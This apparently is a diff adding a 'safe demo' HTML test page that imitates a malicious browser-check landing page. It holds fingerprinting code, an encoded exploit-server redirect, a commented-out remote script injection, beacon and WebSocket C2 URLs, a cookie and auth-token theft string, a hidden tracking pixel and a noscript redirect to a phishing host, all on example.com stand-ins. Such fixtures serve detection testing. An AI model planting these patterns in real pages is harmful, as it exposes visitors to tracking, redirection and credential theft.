@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <!-- SAFE DEMO: Simulates a malicious redirect/exploit page -->
+</head>
+<body>
+    <p>Please wait while we verify your browser...</p>
+    <script>
+        // SAFE: Pattern simulation only — no actual redirects or exploits
+        
+        // Pattern: browser fingerprinting
+        var fp = {
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        console.log("[SAFE] Fingerprint collected (not sent): " + JSON.stringify(fp));
+        
+        // Pattern: encoded redirect URL
+        var encodedRedirect = "aHR0cDovL2V4cGxvaXQtc2VydmVyLmV4YW1wbGUuY29tL2xhbmRpbmc/dmlkPTEyMw==";
+        console.log("[SAFE] Encoded redirect URL present (not followed)");
+        
+        // Pattern: dynamic script injection (SAFE — commented out)
+        // var s = document.createElement('script');
+        // s.src = 'http://evil-cdn.example.com/exploit_kit.js';
+        // document.body.appendChild(s);
+        
+        // Pattern: XMLHttpRequest beacon (SAFE — only constructs)
+        var beaconUrl = "http://evil-tracker.example.com/pixel?id=" + Math.random();
+        console.log("[SAFE] Beacon URL pattern: " + beaconUrl + " (not sent)");
+        
+        // Pattern: WebSocket C2 channel (SAFE — only references)
+        var wsUrl = "ws://c2-server.example.com:8443/control";
+        console.log("[SAFE] WebSocket C2 pattern present (not connected)");
+        
+        // Pattern: localStorage exfiltration (SAFE — only references)
+        var stolenData = "document.cookie + localStorage.getItem('auth_token')";
+        console.log("[SAFE] Data theft pattern present (not executed)");
+    </script>
+    
+    <!-- Hidden tracking pixel pattern -->
+    <img src="http://evil-tracker.example.com/pixel.gif" width="1" height="1" style="display:none" alt="">
+    
+    <!-- Hidden form for credential harvesting -->
+    <iframe src="about:blank" name="hidden_frame" style="display:none"></iframe>
+    
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=http://fallback-phish.example.com/">
+    </noscript>
+</body>
+</html>
